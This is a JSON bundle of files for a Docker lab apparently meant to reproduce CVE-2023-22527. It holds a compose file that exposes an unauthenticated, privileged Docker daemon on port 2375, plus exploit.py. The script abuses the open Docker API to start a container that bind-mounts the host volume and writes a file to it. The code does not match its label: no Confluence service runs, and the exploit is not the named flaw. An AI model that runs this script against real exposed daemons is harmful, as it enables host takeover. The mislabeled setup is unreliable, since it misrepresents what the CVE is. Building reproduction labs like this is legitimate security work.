{
    "files": [
        {
            "location": "./../../dockers/CVE-2023-22527/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\nservices:\n  docker:\n    build: ./docker\n    privileged: true\n    ports:\n      - \"2375:2375\"\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    volumes:\n      - docker_data:/var/lib/docker\n      - host_data:/host   # use named volume for host interaction\n    command: [\"--host=tcp://0.0.0.0:2375\", \"--storage-driver=overlay2\"]\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:2375/_ping\"]\n      interval: 5s\n      timeout: 2s\n      retries: 5\n  testapp:\n    build: ./testapp\n    depends_on:\n      docker:\n        condition: service_healthy\n    privileged: true\n    command: [\"python\", \"exploit.py\"]\n    environment:\n      - DOCKER_HOST=tcp://docker:2375\n    volumes:\n      - host_data:/host   # share the same named volume\n  postgres:\n    image: postgres:13-alpine\n    environment:\n      - POSTGRES_USER=confluence\n      - POSTGRES_PASSWORD=confluence_pass\n      - POSTGRES_DB=confluence_db\n    ports:\n      - \"5432:5432\"\n    volumes:\n      - pg_data:/var/lib/postgresql/data\nvolumes:\n  host_data:\n  pg_data:\n  docker_data:\n"
        },
        {
            "location": "./../../dockers/CVE-2023-22527/custom_no_tool/docker/Dockerfile",
            "content": "FROM docker:20.10.13-dind\nRUN apk add --no-cache curl"
        },
        {
            "location": "./../../dockers/CVE-2023-22527/custom_no_tool/testapp/Dockerfile",
            "content": "FROM python:3.9-slim\nWORKDIR /app\nCOPY exploit.py .\nRUN pip install requests\nCMD [\"python\", \"exploit.py\"]"
        },
        {
            "location": "./../../dockers/CVE-2023-22527/custom_no_tool/testapp/exploit.py",
            "content": "import json, requests, time\n\ndocker_host = 'http://docker:2375'\n\ndef wait_for_docker():\n    \"\"\"Poll the Docker daemon _ping endpoint until it returns OK or timeout.\"\"\"\n    for _ in range(30):  # wait up to ~30 seconds\n        try:\n            resp = requests.get(f'{docker_host}/_ping')\n            if resp.status_code == 200 and resp.text.strip() == 'OK':\n                return True\n        except requests.exceptions.RequestException:\n            pass\n        time.sleep(1)\n    return False\n\nif not wait_for_docker():\n    print('Docker daemon not reachable')\n    exit(1)\n\n# Pull a lightweight image (alpine)\nresp = requests.post(f'{docker_host}/images/create', params={'fromImage': 'alpine', 'tag': 'latest'})\nprint('Pull image response:', resp.status_code)\n\n# Create a container that writes a file on the host via a bind mount\ncontainer_config = {\n    'Image': 'alpine:latest',\n    'Cmd': ['sh', '-c', \"echo 'exploited' > /host/exploit.txt\"],\n    'HostConfig': {\n        'Binds': ['/host:/host']\n    }\n}\nresp = requests.post(f'{docker_host}/containers/create', json=container_config)\ncontainer_id = resp.json().get('Id')\nprint('Created container ID:', container_id)\n\n# Start the container\nrequests.post(f'{docker_host}/containers/{container_id}/start')\nprint('Container started, exploit should have created /host/exploit.txt on the host')\n"
        }
    ],
    "directory_tree": "CVE-2023-22527/custom_no_tool/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 docker/\n\u2502   \u2514\u2500\u2500 Dockerfile\n\u2514\u2500\u2500 testapp/\n    \u251c\u2500\u2500 Dockerfile\n    \u2514\u2500\u2500 exploit.py"
}